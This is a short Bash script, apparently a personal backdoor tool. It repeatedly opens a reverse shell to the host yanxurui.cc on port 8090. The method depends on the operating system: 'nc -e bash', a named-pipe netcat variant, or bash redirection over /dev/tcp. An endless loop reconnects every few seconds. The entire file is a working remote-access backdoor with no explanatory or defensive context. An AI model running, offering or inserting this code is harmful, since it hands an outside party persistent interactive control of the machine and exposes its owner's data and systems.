backshell_nc()
{
    nc yanxurui.cc 8090 -e bash
}

backshell_nc_pipe()
{
    mkfifo /tmp/tmp_fifo
    cat /tmp/tmp_fifo | /bin/bash 2>&1 | nc yanxurui.cc 8090 > /tmp/tmp_fifo
}

backshell_tcp()
{
    bash >& /dev/tcp/yanxurui.cc/8090 <&1
}

backshell ()
{
    date

    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Linux
        backshell_nc
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        # Mac OSX
        backshell_tcp
    elif [[ "$OSTYPE" == "cygwin" ]]; then
        # POSIX compatibility layer and Linux environment emulation for Windows
        echo "Todo"
    elif [[ "$OSTYPE" == "msys" ]]; then
        echo "Todo"
        # Lightweight shell and GNU utilities compiled for Windows (part of MinGW)
    elif [[ "$OSTYPE" == "win32" ]]; then
        echo "Todo"
        # I'm not sure this can happen.
    elif [[ "$OSTYPE" == "freebsd"* ]]; then
        echo "Todo"
        # ...
    else
        # Unknown.
        backshell_nc
    fi

    echo "session ended"

    # sleep for a while in case nc fails and this loop consmes too much CPU
    # this could happen when the client has not Internet access or the server is not running
    sleep 3
}

loop()
{
    while true
    do
        backshell
    done
}

loop
